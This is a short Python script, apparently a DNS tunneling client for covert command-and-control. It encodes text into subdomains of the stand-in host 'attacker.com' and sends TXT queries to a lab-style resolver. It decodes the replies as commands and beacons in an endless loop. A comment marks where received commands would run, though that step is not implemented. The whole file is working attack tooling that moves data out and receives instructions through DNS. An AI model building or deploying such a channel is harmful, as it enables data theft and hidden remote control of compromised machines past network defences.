
import base64
import dnslib
import socket
import time

def print_status(s: str): 
    print(f"[*] {s}")


class Tunneler: 
    def __init__(self, attacker_domain: str, resolver_ip_addr: str): 
        self.attacker_domain = attacker_domain
        self.resolver_ip_addr = resolver_ip_addr
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def tunnel(self, text: str) -> str | None: 
        # chunked_string = self._chunk_string(text)

        # for payload in chunked_string: 
        encoded = base64.urlsafe_b64encode(text.encode()).decode().strip("=")

        domain = f"{encoded}.{self.attacker_domain}"

        print_status(f"Resolving query {domain}")

        q = dnslib.DNSRecord.question(domain, qtype="TXT")

        self.socket.sendto(q.pack(), (self.resolver_ip_addr, 53))

        response, _ = self.socket.recvfrom(4096)

        reply = dnslib.DNSRecord.parse(response)

        for rr in reply.rr: 
            if rr.rtype == dnslib.QTYPE.TXT: 
                return base64.urlsafe_b64decode(str(rr.rdata)).decode()
        return None
        

    def _chunk_string(self, s: str): 
        return [s[i:i+30] for i in range(0, len(s), 30)]


def main(): 
    tunneler = Tunneler("attacker.com", "10.0.2.51")
    to_tunnel = "DNS Tunneling Established"
    while True: 
        response = tunneler.tunnel(to_tunnel)
        if not response: 
            continue
        print_status(response)
        if response == "ACK": 
            continue
        # execute response and set to tunnel to the output
        
        time.sleep(5)


if __name__ == "__main__": 
    main()

